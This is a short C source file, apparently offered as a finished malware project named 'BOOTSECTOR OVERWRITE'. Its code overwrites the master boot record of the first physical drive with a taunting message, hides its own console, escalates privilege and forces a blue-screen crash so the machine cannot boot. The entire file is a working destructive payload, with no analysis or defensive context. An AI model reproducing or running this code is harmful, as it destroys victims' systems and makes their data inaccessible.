/** ==================================================
 * 
 * BOOTSECTOR OVERWRITE Project v1.1
 * Coded By : ZELROTH
 * Date : 2024/09/27 - 19:33:12.22
 * 
 * References :
 * 
 * 1 - https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfile
 * 2 - https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
 * 3 - https://docs.microsoft.com/en-us/windows/win32/api/ntstatus/nf-ntstatus-rtladjustprivilege
 * 4 - https://docs.microsoft.com/en-us/windows/win32/api/ntstatus/nf-ntstatus-ntraiseharderror
 * 
 ================================================== **/



#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include "ntdll.h"


/* ==================== Linking Libraries ==================== */
#pragma comment(lib, "ntdll.lib")

/* ==================== Constants ==================== */
#define MBR_SIZE 512
#define MESSAGE "Your PC GOT FUCKED UP :0"

/* ==================== SystemManipulator Structure ==================== */
typedef struct SystemManipulator {
} SystemManipulator;


/* ==================== Function Declarations ==================== */
extern NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);


/* ==================== Function Definitions ==================== */
void SystemManipulator_HideConsole(SystemManipulator* this);
void SystemManipulator_InduceBlueScreen(SystemManipulator* this);
bool SystemManipulator_WriteToMBR(SystemManipulator* this, const char* message);
void SystemManipulator_Execute(SystemManipulator* this);



/* ==================== Function Implementations ==================== */
void SystemManipulator_HideConsole(SystemManipulator* this) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
}

void SystemManipulator_InduceBlueScreen(SystemManipulator* this) {
    BOOLEAN bl;
    ULONG Response;
    RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response);
}

bool SystemManipulator_WriteToMBR(SystemManipulator* this, const char* message) {
    char mbrData[MBR_SIZE] = {0};
    size_t messageLength = strlen(message);
    if (messageLength > MBR_SIZE) {
        messageLength = MBR_SIZE;
    }
    memcpy(mbrData, message, messageLength);

    HANDLE MasterBootRecord = CreateFile(L"\\\\.\\PhysicalDrive0",
        GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);

    if (MasterBootRecord == INVALID_HANDLE_VALUE) {
        return false;
    }

    DWORD written;
    bool result = WriteFile(MasterBootRecord, mbrData, sizeof(mbrData), &written, NULL);
    CloseHandle(MasterBootRecord);
    return result;
}

void SystemManipulator_Execute(SystemManipulator* this) {
    if (SystemManipulator_WriteToMBR(this, MESSAGE)) {
        SystemManipulator_HideConsole(this);
        SystemManipulator_InduceBlueScreen(this);
    }
}

/* ==================== Main Function ==================== */
int main() {
    SystemManipulator manipulator;
    SystemManipulator_Execute(&manipulator);
    return EXIT_SUCCESS;
}